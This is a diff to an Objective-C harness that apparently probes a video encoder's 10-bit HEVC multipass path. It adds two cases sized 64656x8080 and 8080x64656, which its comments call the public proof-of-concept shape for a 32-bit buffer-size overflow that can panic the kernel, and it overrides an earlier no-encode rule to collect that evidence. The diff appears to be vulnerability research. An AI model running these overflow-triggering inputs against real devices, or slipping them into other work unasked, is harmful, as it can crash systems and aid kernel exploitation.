@@ -1089,7 +1089,17 @@ static void p001DiffPorts(NSMutableString *out, const char *label,
 
     // Wrap / oversize Create+Prepare. Tiny 64x64 EncodeFrame so we don't OOM.
     // w/h chosen against the 22H311 unguarded 32-bit calc family.
+    // v2 (2026-10-28): THE 64747 POC DIMS CASES — the public PoC wrap shape is
+    // ~64656x8080 (and transpose) in the 10-bit HEVC multipass path: dims that
+    // PASS the encoder caps while the 32-bit LRB size math wraps. The big
+    // squares (16384^2, 0x7fff^2) only soft-fail -19354 = encoder-caps rejects,
+    // never reaching the vulnerable CalcBufSize. The p039-v2 "no EncodeFrame"
+    // law is OVERRIDDEN for this tap per the kernel-attestation goal (a panic
+    // here WOULD be the 64747-family kernel receipt, the same evidence class
+    // as note 275's ANE receipts; in-flight log + one-tap-per-force-quit hold).
     struct { const char *label; int32_t w, h; BOOL encodeTiny; } cases[] = {
+        { "POC 64747 64656x8080 + tiny enc",   64656,    8080,    YES },
+        { "POC 64747 8080x64656 + tiny enc",   8080,     64656,   YES },
         { "at-cap-ish 8192x8192",          8192,    8192,    NO  },
         { "CheckInfo-over 65521x8192",     65521,   8192,    NO  },
         { "wrap 65536x65536",              65536,   65536,   NO  },
